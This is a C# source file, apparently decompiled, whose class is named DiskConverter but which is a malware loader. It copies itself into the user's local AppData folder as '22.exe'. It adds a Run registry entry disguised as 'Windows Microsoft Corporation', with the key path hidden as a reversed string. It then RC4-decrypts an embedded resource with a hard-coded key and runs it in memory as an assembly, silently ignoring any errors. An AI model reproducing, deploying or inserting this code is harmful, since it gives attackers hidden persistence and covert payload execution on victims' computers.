using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

internal sealed class DiskConverter
{
	private static void CopyDatabase(string[] args)
	{
		object[] parameters = new object[0];
		new Random().Next(300, 750);
		long num = Environment.TickCount;
		_ = Environment.TickCount - num;
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\22.exe"))
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\22.exe");
		}
		string name = CopyDatabase("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS");
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
		registryKey.SetValue("Windows Microsoft Corporation", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\22.exe");
		registryKey.Close();
		try
		{
			ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
			byte[] rawAssembly = CopyDatabase((byte[])resourceManager.GetObject("Aptl0e8cdUC"), "WVXUWUItead0cTmR5H2fcTeeeXmhbyz1N6TwMNlu3SNtOXPvbtOtp11cRT");
			resourceManager.ReleaseAllResources();
			Assembly assembly = Assembly.Load(rawAssembly);
			if (assembly.EntryPoint!.GetParameters().Length > 0)
			{
				parameters = new object[1] { args };
			}
			assembly.EntryPoint!.Invoke(null, parameters);
		}
		catch
		{
		}
	}

	private static string CopyDatabase(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static byte[] CopyDatabase(byte[] byte_0, string string_0)
	{
		byte[] bytes = Encoding.Default.GetBytes(string_0);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes[i % bytes.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
		}
		i = (num = 0);
		for (int j = 0; j < byte_0.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
			int num2 = (array[i] + array[num]) % 256;
			byte_0[j] ^= array[num2];
		}
		return byte_0;
	}
}
